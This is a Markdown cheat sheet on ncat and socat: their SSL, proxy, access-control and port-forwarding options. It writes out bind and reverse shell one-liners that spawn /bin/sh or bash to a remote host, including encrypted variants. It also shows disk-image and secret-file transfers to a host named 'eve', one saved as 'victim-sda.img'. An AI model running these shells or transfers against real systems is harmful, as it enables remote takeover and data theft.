# Sockets and networking

| tool  | description                                               |
| ----- | --------------------------------------------------------- |
| nc    | simplest tool, super portable                             |
| ncat  | evolution of nc, user-friendly with TLS and proxy support |
| socat | most difficult and powerfull                              |

## ncat

> Ncat is a feature-packed networking utility that reads and writes
> data across networks from the command-line. 

ncat is written by nmap project

```
ncat [options...] [hostname] [port]
```

### SSL options

ncat doesn't check for revoked certificates and doesn't support client certificate
verification

```
--ssl                           enable SSL encryption
--ssl-verify                    verify server certificate (client mode only)
--ssl-cert CERT                 verify i only need .crt, not .pem with key
--ssl-key CERT                  change generation script in socat
--ssl-trustfile CERT            
```

Following options aren't ssl related, but handle access control

```
--allow HOST[,HOST,...]         only selected hosts are allowed to connect
--allowfile FILE
--deny HOST[,HOST,...]          selected hosts are denied a connection
--denyfile FILE
```

### Proxy options

ncat can connect through socks4,socks5 and http(s). ncat can also act as an http proxy server (https isn't supported).

```
--proxy HOST[:PORT]                     use only with --proxy-type
--proxy-type (http|socks4|socks5)
--proxy-auth USER[:PASS]
--proxy-dns (local|remote|both|none)
```

### Command execution

You can spawn a simple interactive shell with `-e /bin/sh`. The shell won't be as nice
as socat shell, you will need some bash-fu to elevate it to a fully interactive shell.

```
-e COMMAND      execute command (must be full pathname)
-c COMMAND      execute via sh
```
### Mics

```
--crlf          use CRLF when taking input from stdin
--recv-only
--send-only
--keep-open     allow multiple simultaneous connections (listen mode only)
--chat
--max-conns n   maximum n simultaneous connections
```

### Examples

```bash
# encrypted connection
ncat --ssl 10.0.2.15
ncat --ssl --listen 10.0.2.15

# encrypted connection with authenticated server
ncat --ssl-verify --ssl-trustfile server.crt example.com
ncat --ssl-cert server.crt --ssl-key server.key --listen example.com

# bind shell
ncat -l 8080 -e /bin/sh
ncat bob

# reverse shell
ncat -l 8080
ncat bob -e /bin/sh

# send files
ncat -l 8080 > secret
ncat eve 8080 < secret

# proxy over http with ncat as http proxy server
ncat -vvv -l --proxy-type http --keep
ncat --proxy bob example.com 80
```

## socat

> Socat is a command-line based utility that establishes
> two bidirectional byte streams and transfers data between them

```
socat [options] <address> <address>

-d                  print fatal, error and warning messages
-ly [facility]      write messages to syslong instead of stderr
-lf <file>          write messages to logfile
-T <timeout>        absolute timeout

interesting addresses:

EXEC:<command-line>
OPEN:<filename>

OPENSSL:<host>:<port>
OPENSSL-LISTEN:<port>

TCP:<host>:<port>
TCP-LISTEN:<host>:<port>

UDP:<host>:<port>
UDP-LISTEN:<port>

PROXY:<proxy>:<hostname>:<port>
SOCKS4:<socks-server>:<host>:<port>
```

You can use `-` as an address, in which case socat will read from stdin
(or write to stdout).

### Bind and reverse shells

```bash
# reverse shell
socat FILE:`tty`,raw,echo=0 TCP-LISTEN:1337,reuseaddr
socat TCP:bob:1337 EXEC:bash,pty,stderr,setsid

# bind shell
socat FILE:`tty`,raw,echo=0 TCP:bob:1337
socat TCP-LISTEN:1337,reuseaddr EXEC:bash,pty,stderr,setsid
```

### Encrypted connection

```bash
# any file created won't be readable nor writable to the outside world
umask 0077

# create private key and certificate for client and server
for name in client server; do
    openssl req -newkey rsa:2048 -nodes -keyout "$name.key" -x509 -days 365 -out "$name.crt"
    cat "$name.key" "$name.crt" > "$name.pem"
done

# reset umask to its default state
umask 0002

# encrypted connection, but not verified, vulnerable to MiTM attacks
socat FILE:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=c.pem,verify=0,reuseaddr
socat OPENSSL:bob:4443,verify=0 EXEC:bash,pty,stderr,setsid

# encrypted and verified bind shell
socat OPENSSL-LISTEN:4443,cert=server.pem,cafile=client.crt,reuseaddr,fork EXEC:bash,pty,stderr,setsid 
socat FILE:`tty`,raw,echo=0 OPENSSL:bob:4443,cafile=server.crt,cert=client.pem 

# encrypted and verified reverse shell
socat FILE:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=server.pem,cafile=client.crt,reuseaddr,fork
socat OPENSSL:bob:4443,cafile=server.crt,cert=client.pem EXEC:bash,pty,stderr,setsid
```

The `cafile` option is only needed if you generate self-signed certificates. commonName
of certificate must match hostname of the server.

### Port forwarding

Socat is useful for simple port forwarding, though it cannot do dynamic port 
forwarding.

```
# forward all connections coming to port 8080 to internal-admin-panel:80
socat TCP-LISTEN:8080:reuseaddr,fork TCP:internal-admin-panel.com:80

# forward traffic coming to port 1234 through http proxy server to private-server
socat TCP-LISTEN:1234,reuseaddr,fork \
PROXY:my-http-proxy-server.com:private-server.com:80,proxyport=8081,proxy-authorization-file=creds.txt

# forward traffic through socks proxy server
socat TCP-LISTEN:3389,fork SOCKS4A:my-socks-server:target.com:80
```

### File transfer

Simple example of transferring files, unencrypted for simplicity.

```bash
socat TCP4-LISTEN:443,fork file:sda.img
socat TCP4:eve:443 file:victim-sda.img,create
```

### Other options

Useful options of socket and range options groups:

```
bind=[ hostname | hostaddress ][ :( service | port ) ] 
bind=127.0.0.1
bind=example.com:http
bind=10.0.0.1:443

range=<address-range>       accept connection only from hosts from address-range
range=10.0.0.0/8
range=[fe80]::/10

keepalive   allow sending keepalive on the socket
tcpwrap     use /etc/hosts.allow and /etc/hosts.deny to accept/deny connection
fork        allow multiple connections to be made
```
